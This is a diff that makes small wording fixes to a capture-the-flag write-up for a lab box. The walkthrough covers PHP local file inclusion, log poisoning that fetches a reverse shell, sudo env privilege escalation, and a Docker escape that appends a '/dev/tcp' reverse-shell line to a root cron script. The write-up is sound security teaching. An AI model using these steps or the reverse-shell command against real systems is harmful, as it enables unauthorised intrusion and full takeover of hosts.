@@ -6,7 +6,7 @@ tags:
 image: /images/dog/info.png
 ---
 
-Apart from the the name I really can't think of anything thats wrong with this box. It was a really fun box. I think I learnt the most during the initial foothold and after that the user,root and docker escaping was just like a CTF puzzle. The main thing I learnt in this room was the use cases of Local File inclusion. Before I used to think that LFI was just a vulnerability to read some files on a system. Turns out I was dead wrong hackers can really turn even the the simplest of the bugs to a fully fledged PWN. Lets see what I am talking about.
+Apart from the the name I really can't think of anything thats wrong with this box. It was a really fun box. I think I learnt the most during the initial foothold and after that the user,root and docker escaping was just like a CTF puzzle. The main thing I learnt in this room was the use cases of Local File inclusion. Before I used to think that LFI was just a vulnerability to read some files on a system. Turns out I was dead wrong and hackers can really turn even the the simplest of the bugs to a fully fledged PWN. Lets see what I am talking about.
 
 <!--more-->
 
@@ -47,11 +47,11 @@ Here is an error which reveals some information
 
 It was time to do some google-fu on LFI. I find this [awesome article](https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601) which will give us the necessary information. So I come across a lot of new stuff like php wrappers. 
 
-After trying some of the things given in the article I finally find a method that worked. We can use the php filter to get a resource from the machine and it will spit out its contents in base64 form. Lets try using a file we know already exists.
+After trying some of the things given in the article I finally find a method that worked. We can use the php filter to get a resource from the machine and it will spit out its contents in base64 form. Lets try displaying a file we know already exists.
 
 <img src="/images/dog/b64.png" width="1000">
 
-When we decode it the content.
+When we decode it's content.
 
 {%highlight text%}
 echo PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg== | base64 -d
@@ -92,7 +92,7 @@ echo PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4
 
 Now we can see what is going on inside the index.php file. We see a ext parameter which we can set to read files even if they not a php files. As observed there was indeed a check for "dog" and "cat" strings.
 
-Now that we can read index.php we can read the flag.php file too which we found earlier in the dirbuster and that will give us our first flag. Next we find a technique known as Log File Contamination which I got to know of from the same medium article that I referenced earlier.
+Now that we can read index.php, we can read the flag.php file too which we found earlier in the dirbuster and that will give us our first flag. Next we find a technique known as Log File Contamination which I got to know of from the same medium article that I referenced earlier.
 
 Basically this is what it does:
 
@@ -102,7 +102,7 @@ First lets see if we can read the log files using the php filter and the ext par
 
 <img src="/images/dog/logs.png"/>
 
-So that was a success. Next try introducing some php code in one of the headers to download a file from out server on the target machine. We will fire up a python server and transfer a php-reverse-shell.php (you can find it on pentest monkey) file onto the machine.  
+So that was a success. Next I try introducing some php code in one of the headers to download a file from out server on the target machine. We will fire up a python server and transfer a php-reverse-shell.php (you can find it on pentest monkey) file onto the machine.  
 
 - [How to download a file using php](https://www.geeksforgeeks.org/download-file-from-url-using-php/)
 
@@ -127,7 +127,7 @@ Serving HTTP on 0.0.0.0 port 15000 (http://0.0.0.0:15000/) ...
 10.10.24.222 - - [17/Sep/2020 17:32:40] "GET /php-reverse-shell.php HTTP/1.0" 200 -
 {%endhighlight%}
 
-So now that we have transfere the reverse shell, all we need to do is browse to it and we will hopefully get a netcat connection. 
+So now that we have transferred the reverse shell, all we need to do is browse to it and we will hopefully get a netcat connection. 
 
 {%highlight text%}
 nc -lvp 1234
@@ -142,7 +142,7 @@ $ whoami
 www-data
 {%endhighlight%}
 
-Finally we have a foothold. Next I just went straight for root since there is probably a flag in the root directory. Doing `sudo -l` we see the clue right away. We are allowed to use /usr/bin/env binary with root privileges. a quick look at [GTFO bins](https://gtfobins.github.io/gtfobins/env/) and we are done.
+Finally we have a foothold. Next I just went straight for root since there is probably a flag in the root directory. Doing `sudo -l` we see the clue right away. We are allowed to use "/usr/bin/env" binary with root privileges. a quick look at [GTFO bins](https://gtfobins.github.io/gtfobins/env/) and we are done.
 
 {%highlight text%}
 $ sudo -l
@@ -162,7 +162,7 @@ root@8336dd21a590:/#
 
 Aannd.... we are root already. You can find the flags in the root directory and the "/var/www/" directory. You can get a better shell with "/bin/bash -i" command if you like.
 
-So that makes it 3 out of 4 flags. I remember looking at the docker tag under the room description. Lookslike we need to escape a docker conatiner. Looking online I found only the exploits which I can't even think of using due to the technicalities. I know that this is a medium level room only so lets try enumerating a bit more.
+So that makes it 3 out of 4 flags. I remember looking at the docker tag under the room description. Looks like we need to escape a docker conatiner. Looking online I found only the exploits which I can't even think of using due to the sheer amount of technicalities. I know that this is a medium level room only so lets try enumerating a bit more.
 
 I look around and finally find something interesting inside the "/opt/" directory. We see a backup script and a backup file.
 
@@ -198,7 +198,7 @@ Looks pretty recent to me. There is always a possiblity that this script is owne
 root@8336dd21a590:/opt/backups# echo "bash -i >& /dev/tcp/YourIP/5678 0>&1" >> backup.sh
 {%endhighlight%}
 
-So when it is finally run automatically we will get  reverse shell as the real owner of the machine. Start up a netcat listener on another port that is not occupied. A few seconds later...
+So when it is finally run automatically we will get reverse shell as the real owner of the machine. Start up a netcat listener on another port that is not occupied. A few seconds later...
 
 {%highlight text%}
 nc -lvp 5678
